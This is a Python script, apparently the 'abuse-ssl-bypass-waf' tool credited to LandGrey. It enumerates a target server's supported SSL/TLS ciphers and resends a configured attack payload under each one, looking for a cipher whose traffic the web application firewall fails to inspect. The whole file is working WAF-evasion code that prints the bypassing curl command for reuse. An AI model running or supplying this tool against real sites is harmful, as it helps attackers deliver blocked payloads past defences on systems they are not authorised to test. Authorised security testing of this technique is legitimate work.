#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey
#

import re
import time
try:
    import urlparse
except ModuleNotFoundError:
    from urllib import parse as urlparse
import argparse
import threading
import subprocess
from threading import Timer
from multiprocessing.dummy import Pool

from config import *


def target_handle(target):
    if not target.startswith("https://"):
        target = "https://" + target.rstrip("/")
    scheme, netloc, url, params, query, fragment = urlparse.urlparse(target)
    return "{}://{}".format(scheme, netloc)


def is_alive():
    global target
    response = curl_request(target_handle(target), alive_command)
    if response is None or response == "":
        return False
    else:
        return True


def curl_request(target, command, timeout=15):
    if "://" not in command[-1]:
        command.append(target)
    else:
        command.remove(command[-1])
        command.append(target)
    execute = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timer = Timer(timeout, execute.kill)
    try:
        timer.start()
        stdout, stderr = execute.communicate()
        return stdout
    except:
        return None
    finally:
        timer.cancel()


def get_supported_ciphers():
    global target
    ciphers = []
    body = curl_request(target, ciphers_command, timeout=60)
    for line in body.decode().split("\n"):
        match = re.findall("(Accepted|Preferred)\s+(.*?)\s+(.*?)\s+bits\s+(.*)", line.strip())
        if match:
            ciphers.append(str(match[0][3]).split()[0])
    return ciphers


def single_cipher_request(cipher):
    global target, count, base_length, cipher_content_length
    count = 0
    command = []

    for x in curl_command:
        command.append(x)
    command.append('--cipher')
    command.append(cipher)

    cipher_response = curl_request(target + payload_request, command)
    mutex.acquire()
    if enable_waf_keyword:
        if not re.findall(hit_waf_regex, cipher_response):
            if len(cipher_response) == 0:
                count += 1
                print("[+] Cipher:{:35} Response Length: [0]".format(cipher))
            else:
                print("[+] Success! Find Bypass Cipher: {}".format(cipher))
                exit("[+] Please Test: [{}]".format('{} "{}"'.format(" ".join(curl_command[:-1]), target + payload_request)))
        else:
            count += 1
            print("[-] Cipher:{:35} Filter By Waf!".format(cipher))
    else:
        cipher_length = len(cipher_response)
        if base_length != cipher_length:
            cipher_content_length.append({cipher: cipher_length})
            print("[+] Cipher:{:35} Response Length: [{}]".format(cipher, cipher_length))
        elif cipher_length == 0:
            print("[+] Cipher:{:35} Response Length: [0]".format(cipher))
        else:
            count += 1
            print("[+] Cipher:{:35} Response Length: [Same as Base Response]".format(cipher))
    mutex.release()


def bypass_testing(threads=1):
    global target, base_length
    if is_alive():
        print("[+] Target: {} is alive".format(target))
    else:
        exit("[-] Target: {} cannot connected".format(target))

    print("[+] Testing Web Server Supported SSL/TLS Ciphers ...")
    ciphers = get_supported_ciphers()
    if len(ciphers) > 0:
        print("[+] {} Supported [{}] SSL/TLS Ciphers".format(target, len(ciphers)))
    else:
        exit("[-] No SSL/TLS Ciphers of target supported")

    base_content_1 = curl_request(target, curl_command)
    base_content_2 = curl_request(target + normal_request, curl_command)
    if len(base_content_1) == len(base_content_2):
        base_length = len(base_content_1)
        print("[!] Response-1 == Response-2 length:[{}]".format(len(base_content_1)))
    else:
        base_length = len(base_content_2)
        print("[+] Request-1:{}  Request-2:{}".format(target, target + normal_request))
        print("[!] Response-1 length:[{}]  !=  Response-2 length:[{}]".format(len(base_content_1), len(base_content_2)))

    print("[+] Now Request: {}".format(target + payload_request))

    if threads > 1:
        pool = Pool(threads)
        pool.map(single_cipher_request, ciphers)
        pool.close()
        pool.join()
    else:
        for cipher in ciphers:
            single_cipher_request(cipher)

    if not enable_waf_keyword:
        bcl_count = 0
        base_cipher_length = list(dict(cipher_content_length[0]).values())[0]
        for d in cipher_content_length:
            if list(dict(d).values())[0] == base_cipher_length:
                bcl_count += 1
    else:
        bcl_count = -1
    if count == len(ciphers) or bcl_count == len(ciphers):
        print("[-] Failed! Abusing SSL/TLS Ciphers Cannot Bypass Waf")
    else:
        print("[*] Finished! Please check response content length and find whether there is bypass way")


if __name__ == "__main__":
    start = time.time()
    parser = argparse.ArgumentParser(prog='abuse-ssl-bypass-waf.py')
    parser.add_argument("-regex", dest='regex', default='default', help="hit waf keyword or regex")
    parser.add_argument("-thread", dest='thread', default=1, type=int, help="numbers of multi threads")
    parser.add_argument("-target", dest='target', default='default', help="the host ip or domain")

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    if args.regex != 'default':
        enable_waf_keyword = True
        hit_waf_regex = args.regex

    count = 0
    base_length = 0
    target = target_handle(args.target)
    cipher_content_length = []
    mutex = threading.Lock()
    bypass_testing(int(str(args.thread)))
    print("[+] Cost: {:.6} seconds".format(time.time() - start))
